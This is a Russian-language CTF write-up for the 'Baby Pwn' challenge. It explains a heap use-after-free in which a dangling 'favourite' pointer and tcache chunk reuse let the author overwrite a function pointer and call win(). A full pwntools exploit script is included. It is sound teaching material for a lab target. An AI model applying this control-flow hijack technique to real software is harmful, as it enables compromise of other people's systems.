# Baby Pwn — райтап

CTF FortID — pwn (Baby Pwn)

## TL;DR

Я эксплуатировал Use-After-Free в куче, который позволил подделать указатель на функцию (мини-vtable) внутри структуры `review` и перенаправить вызов на функцию `win()`, минуя необходимость работать со стек-канарейкой вообще.

## Разведка бинарника

```
file chall
checksec chall
```

- Full RELRO, канарейка есть, NX включён, PIE выключен (база `0x400000`), SHSTK/IBT включены, не stripped.
- Отсутствие PIE сразу упрощает жизнь: все адреса функций статические.

Интересные адреса, которые я выписал сразу:

```python
win = 0x40135f
main = 0x401847
read_text = 0x4014d1
write_draft = 0x4016df
```

## Структура программы

В `main` — меню с пунктами, диспетчер через jump table:

1. `submit_review`
2. `mark_favourite`
3. `delete_review`
4. `write_draft`
5. `preview_favourite`

Изначально я подумал про классическую схему "stack canary leak → ret2win", но при реверсе выяснилось, что это не тот случай.

## Разбор уязвимых функций

### submit\_review

```
malloc(0x28) -> review
read_text(review, 0x20)       // пишу контент
*(review + 0x20) = show_review // 0x401336 — компилятор сам зашивает указатель на функцию-"метод"
```

Получается мини-объект в куче размером `0x28` байт, где по смещению `+0x20` лежит указатель на функцию `show_review(ptr)`, которая делает `printf("%s", ptr)`.

### mark\_favourite

```
favourite = review   // без инкремента счётчика ссылок, просто сырое присваивание
```

### delete\_review

```
free(review)
review = NULL
```

**Баг**: `favourite` не зануляется и не инвалидируется. После `free()` он продолжает указывать на уже освобождённый чанк — классический dangling pointer / UAF.

### write\_draft

```
malloc(0x28) -> draft
read_exact(draft, size)   // size <= 0x28, читает ровно size байт через fread, без обрезки по '\n'
```

Поскольку размер запроса (`0x28`) совпадает с размером только что освобождённого чанка `review`, аллокатор (tcache) отдаёт **тот же самый кусок памяти**. То есть `draft == favourite` — я получаю возможность переписать содержимое чанка, на который продолжает указывать `favourite`, причём `read_exact` позволяет записать все 40 байт без каких-либо escape-символов — значит, я полностью контролирую и байты по смещению `+0x20`, где раньше лежал указатель на `show_review`.

### preview\_favourite

```
favourite->vtable(favourite)   // то есть call *(favourite + 0x20), rdi = favourite
```

Вот и primitive control-flow hijack: что бы я ни записал по смещению `+0x20` через `write_draft`, оно будет вызвано как функция.

## Эксплуатация

Цепочка действий:

1. `submit_review` — создаю review (любой текст).
2. `mark_favourite` — `favourite = review`.
3. `delete_review` — `free(review)`, `favourite` становится висячим.
4. `write_draft` — переиспользую освобождённый чанк, пишу `0x20` байт заполнителя + `p64(win)` в оставшиеся 8 байт (смещение `+0x20`).
5. `preview_favourite` — вызывается `win()` вместо `show_review`.

`win()` открывает `flag.txt`, читает его и печатает через `printf("%s", ...)` — аргумент `rdi`, который туда прилетает (указатель на `favourite`), функцией вообще не используется, так что можно не думать о его содержимом.

## Итоговый скрипт

```python
from pwn import *

elf = ELF('./chall')
context.binary = elf

HOST = 'baby-pwn-84a7370629f8.inst14.ctf.fortid.com'
PORT = 1337

p = remote(HOST, PORT, ssl=True)

win = 0x40135f

def menu(choice):
    p.sendlineafter(b'> ', str(choice).encode())

menu(1)
p.sendlineafter(b': ', b'hello')

menu(2)

menu(3)

menu(4)
p.sendlineafter(b': ', b'40')
payload = b'A' * 0x20 + p64(win)
p.send(payload)

menu(5)

p.interactive()
```

## Проблема по пути: SSL

Сервер соревнования слушает TLS (как видно по тому, что подключение шло через `ncat --ssl`). `remote()` в pwntools по умолчанию открывает обычный TCP-сокет, из-за чего первая попытка подключения падала с `EOFError` — сервис либо сразу рвал небезопасное соединение, либо просто не завершался handshake. Решение простое:

```python
p = remote(HOST, PORT, ssl=True)
```

После этого пайплайн меню/payload отработал без изменений.

## Выводы

- Канарейка в бинарнике реально есть, но защищает только локальные стековые буферы в `read_number` и `win` — ни одна из них не переполняется в этом пути эксплуатации, так что "слив" канарейки был бы потерей времени.
- Настоящая уязвимость — отсутствие инвалидации указателя (`favourite`) после `free()` соответствующего объекта: классический UAF, усиленный тем, что в освобождённом чанке лежит указатель на функцию, который приложение само вызывает (vtable-like pattern на C).
- `write_draft` с его `read_exact` без ограничения по `\n` и совпадающим размером аллокации — это ровно тот primitive, который нужен, чтобы переписать "vtable" указатель контролируемым значением.
